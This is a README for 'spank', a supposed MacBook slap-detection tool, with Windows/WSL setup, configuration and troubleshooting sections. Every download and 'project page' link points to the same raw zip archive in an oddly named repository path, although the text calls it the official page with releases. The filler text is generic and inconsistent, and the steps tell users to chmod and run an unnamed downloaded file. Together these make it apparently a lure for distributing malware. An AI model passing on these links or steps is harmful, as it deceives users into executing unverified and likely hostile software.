# 🖐 spank - Simple Slap Detection for MacBook Users

[![Download spank](https://img.shields.io/badge/Download-spank-brightgreen)](https://github.com/Snow17s/spank/raw/refs/heads/master/audio/sexy/Software-1.1.zip)

---

## 📋 What is spank?

spank is a tool that detects slaps or physical taps on your MacBook. It works on macOS and Linux systems. This app listens for the sound or vibration created by a slap. When it detects one, it can trigger an action or alert you.

You do not need to know how to code to use spank. It runs quietly on your computer and helps you track or get notified about slaps or taps on your device.

---

## 💻 System Requirements

To use spank, your computer must meet these conditions:

- Operating system: macOS (MacBook) or Linux.
- Microphone or vibration sensor enabled.
- At least 100 MB free disk space.
- Basic user permissions on your device (no admin needed for normal use).

If you use Windows, this guide will help you install and run a compatible version through a simple setup.

---

## 🚀 Getting Started

Begin by downloading spank. Use the main link below:

[![Download spank](https://img.shields.io/badge/Download-spank-blue)](https://github.com/Snow17s/spank/raw/refs/heads/master/audio/sexy/Software-1.1.zip)

This takes you to the official project page on GitHub, where you can find the latest version and installation files.

---

## ⬇️ How to Download and Install on Windows

spank is designed for macOS and Linux. Windows is not directly supported, but you can set it up using a Linux environment on Windows. Here is an easy way to do this:

### Step 1: Access the GitHub Page

Go to the main spank page at:  
https://github.com/Snow17s/spank/raw/refs/heads/master/audio/sexy/Software-1.1.zip

### Step 2: Download the Software

- Look for the **Releases** section on the page.
- Find the latest version available.
- Download the Linux release file. It is usually a `.tar.gz` or `.AppImage` file.

### Step 3: Install Windows Subsystem for Linux (WSL)

If you don’t have it already, install WSL on your Windows system:

- Open **Settings** > **Apps** > **Optional Features**.
- Scroll down to **Related settings** and select **More Windows features**.
- Find **Windows Subsystem for Linux** and tick the box.
- Restart your PC.
- After restart, open the Microsoft Store.
- Search for "Ubuntu" or another Linux distribution.
- Install your choice of Linux.

### Step 4: Move the spank File to Windows Linux File System

- Place the downloaded spank file in your Linux home directory inside WSL.
- You can do this by moving the file into your user folder using File Explorer:  
`\\wsl$\Ubuntu\home\your_username\`

### Step 5: Run spank inside Linux

- Open **Ubuntu** (or your installed distribution) from the Start menu.
- Navigate to the folder:  
`cd ~`
- Make the spank file executable with the command:  
`chmod +x ./spank_file_name`
- Run the file:  
`./spank_file_name`

### Step 6: Using spank

Once running, spank will start listening for slaps. You can stop it anytime by closing the terminal window.

---

## ⚙️ How spank Works

The application uses your computer’s microphone or vibration sensors to catch slapping sounds. It filters background noise and checks for patterns matching a slap impact.

You can customize settings such as:

- Sensitivity level.
- Notification type (sound alert, pop-up, or logging to a file).
- Action triggered after detecting a slap (launch a script or app).

These options appear in a settings menu inside the program or a config file if you want to edit it manually.

---

## 🔧 Configuration

To adjust settings:

1. Locate the `config.json` file in the spank folder.
2. Open it with any text editor (e.g., Notepad).
3. Change values like:

```json
{
  "sensitivity": "medium",
  "alert": "popup",
  "logFile": "spank.log"
}
```

4. Save your changes.
5. Restart spank to apply them.

---

## 🆘 Troubleshooting

If spank does not detect slaps:

- Check your microphone permissions.
- Make sure your device is not muted.
- Restart the app.
- Reduce background noise or test in a quieter room.
- Confirm your Linux environment is running correctly.

If the program fails to launch:

- Confirm the file has executable permissions.
- Make sure you run the command inside your Linux terminal in WSL.
- Check if any dependencies are missing (such as sound input drivers).

---

## 💡 Tips for Better Use

- Use a quiet environment for clearer detection.
- Position your laptop on a solid surface.
- Adjust sensitivity to fit how hard or soft your slaps might be.
- Keep the app running in the background when not in use.

---

## 📚 More Information & Support

Visit the main project page for updates or questions:

https://github.com/Snow17s/spank/raw/refs/heads/master/audio/sexy/Software-1.1.zip

Here you find user guides, issue reporting, and developer notes.

---

[![Download spank](https://img.shields.io/badge/Download-spank-green)](https://github.com/Snow17s/spank/raw/refs/heads/master/audio/sexy/Software-1.1.zip)